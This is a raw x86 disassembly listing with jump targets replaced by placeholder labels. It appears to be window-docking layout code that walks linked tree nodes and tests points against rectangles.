push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_44166c
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_44141c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4411cc
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4411cc
mov esi eax
push ebp
call sub_4413ec
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44166c
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_441160
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_441160
mov ecx ebx
pop edx
call sub_4123a0
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_438400
mov eax [ ebp - 0x4 ]
call sub_441594
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_441594
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_441594
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_441594
push ebx
mov ebx eax
mov eax ebx
call sub_44109c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_441024
test al al
je r-xdata
mov eax ebx
call sub_4410d0
pop ebx
retn
sub_4415d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4415bc
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44106c
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4415c0
mov edx esi
call sub_4415d0
sub_44160c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_441594
mov edi eax
mov eax ebx
call sub_4410d0
cmp edi eax
jl r-xdata
mov eax esi
call sub_44127c
mov eax [ esi + 0x1c ]
push eax
push sub_44311c
mov edx esi
call sub_441948
mov eax ebx
call sub_441594
mov edi eax
mov eax esi
call sub_441118
cmp edi eax
jle r-xdata
mov eax ebx
call sub_44160c
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_441678
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44109c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_4416a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403228
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403564
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_441048
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c808
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_421cfc
mov edx eax
mov eax ebx
call sub_41c984
mov eax [ ebp - 0x4 ]
call sub_441870
xor eax eax
push ebp
push sub_4417ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43bf58
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44127c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4417b3
mov eax [ ebp - 0x4 ]
call sub_441874
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43bf1c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4417b3
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_443644
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_441808
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_442874
mov eax [ esi + 0x10 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_441888
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_441888
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_441888
pop ecx
sub_4418e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_441888
pop ecx
sub_44190c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44190c
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44190c
pop ecx
sub_441960
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_4418e0
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4411cc
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_4411cc
push eax
mov edx 0x1
mov eax ebx
call sub_441160
push eax
mov edx 0x2
mov eax ebx
call sub_441160
pop edx
pop ecx
call sub_4123a0
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c64
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4419e4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_44141c
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4123a0
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_438400
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_441048
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4418e0
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_44106c
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44290c
mov edx esi
mov eax ebx
call sub_4418e0
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_4389e4
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_441048
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_4389d0
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4411cc
mov edx eax
mov eax edi
call sub_4415bc
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4411cc
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4411cc
mov edx eax
mov eax edi
call sub_4415bc
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4411cc
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_441bf4
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_441d9c
jmp r-xdata
sub_441bf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_441048
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_441594
mov edx eax
mov eax ebx
call sub_4415bc
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_4415bc
mov eax [ esi + 0x64 ]
call sub_441594
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_442c64
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_441948
mov eax [ esi + 0x64 ]
call sub_441594
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_442c64
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_441948
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_442fe8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_441948
mov eax [ esi + 0x64 ]
call sub_441594
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44311c
xor edx edx
mov eax esi
call sub_441948
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4415bc
adc edx 0x0
mov eax ebx
call sub_44127c
mov eax ebx
call sub_44160c
push esi
push sub_44311c
xor edx edx
mov eax esi
call sub_441948
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_441d9c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_44127c
mov eax [ ebx + 0x14 ]
call sub_44160c
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_441e14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_441594
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_441594
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_441594
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_441160
mov esi eax
mov edx 0x2
mov eax ebx
call sub_441160
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_441594
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_44166c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_441694
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44166c
call sub_441e14
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_441694
call sub_441e14
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4411cc
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4411cc
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_442040
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43bf58
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43bf1c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412350
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4420d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_442040
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_441694
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4418e0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_441694
call sub_441e14
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_44215c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403f90
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4045dc
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4421a4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44239c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_442874
mov eax [ ebp - 0x8 ]
call sub_441870
xor edx edx
push ebp
push sub_44237f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442386
mov eax [ ebp - 0x8 ]
call sub_441874
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_441048
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_44215c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403454
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
